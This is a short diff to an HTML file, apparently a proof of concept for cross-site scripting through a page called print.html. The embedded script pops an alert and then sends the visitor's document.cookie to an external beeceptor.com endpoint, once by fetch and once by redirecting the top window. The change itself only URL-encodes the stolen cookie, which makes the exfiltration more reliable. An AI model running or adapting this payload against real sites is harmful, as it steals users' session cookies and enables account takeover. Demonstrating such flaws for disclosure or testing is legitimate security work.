@@ -5,7 +5,7 @@
 	<script>
 		alert('XSS via print.html');
 		fetch('https://splitting.free.beeceptor.com?cookie=' + document.cookie);
-		window.top.location = 'https://splitting.free.beeceptor.com?cookie=' + document.cookie;
+		window.top.location = 'https://splitting.free.beeceptor.com?cookie=' + encodeURIComponent(document.cookie);
 	</script>
 </body>
 </html>
